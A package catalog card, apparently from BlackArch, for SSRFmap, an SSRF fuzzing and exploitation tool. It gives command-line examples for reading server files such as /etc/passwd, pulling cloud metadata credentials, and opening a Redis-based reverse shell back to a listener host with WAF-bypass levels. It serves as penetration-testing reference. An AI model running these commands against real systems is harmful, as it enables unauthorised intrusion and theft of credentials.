---
name: "ssrfmap"
categories:
  - blackarch-webapp
version: "127.290e07d"
homepage: "https://github.com/swisskyrepo/SSRFmap"
packaged-by: [blackarch]
blackarch-builddate: "2026-08-24"
build-system: scripts
license: MIT
meta-checked: "2026-11-09"
github-repo: "swisskyrepo/SSRFmap"
github-stars: 3648
github-pushed: "2026-08-10"
github-archived: false
github-issues: 1
github-match: "exact"
gh-checked: "2026-11-07"
worth: 6.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 7
gh-activity-checked: "2026-11-09"
---

# ssrfmap

> Automatic SSRF fuzzer and exploitation tool that replays a saved request against a parameter.

## What it's for

SSRFmap (swisskyrepo) finds and exploits Server-Side Request Forgery. You give it a saved
HTTP request file (a Burp-captured request works directly) and the name of the parameter to
fuzz; it replaces that parameter's value with SSRF payloads and drives more than twenty
exploitation modules — port and network scanning, file reads, cloud metadata (AWS, GCE,
Alibaba, DigitalOcean), Redis/FastCGI/MySQL/Postgres attacks, SOCKS proxying, SMB hash
forcing, and reverse shells. By default the parameter's whole value is replaced; placing
`*FUZZ*` in the value keeps the surrounding text and injects only at the marker. It is a
targeted SSRF tool, not a general web fuzzer.

## Typical use cases

### Fuzz a request file for SSRF and read files

Take a captured request, pick the suspicious parameter, and run the classic modules.

```
ssrfmap -r request.txt -p url -m readfiles,portscan
```

Outcome: replays the request with SSRF payloads in the `url` parameter; `readfiles` reports readable files (`/etc/passwd` by default, extend with `--rfiles`), `portscan` reports open ports on internal hosts reachable from the target.

### Read cloud metadata through the vulnerable parameter

Target a cloud-hosted application's metadata service.

```
ssrfmap -r request.txt -p url -m aws
```

Outcome: attempts to read provider metadata (credentials, user-data) via the SSRF; use `gce`, `alibaba`, or `digitalocean` modules for the matching provider.

### Get a reverse shell via SSRF

Exploit an internal service (e.g. Redis) reachable through the SSRF and catch the shell locally.

```
ssrfmap -r request.txt -p url -m redis --lhost 198.51.100.10 --lport 4242 -l 4242
```

Outcome: sends the module's payload via the vulnerable parameter pointing back at your host, while `-l 4242` opens a local listener that receives the reverse shell. Raise `--level` (1–5) when a WAF filters the payloads — it escalates encodings and bypass forms.

No corpus evidence — derived from upstream documentation.
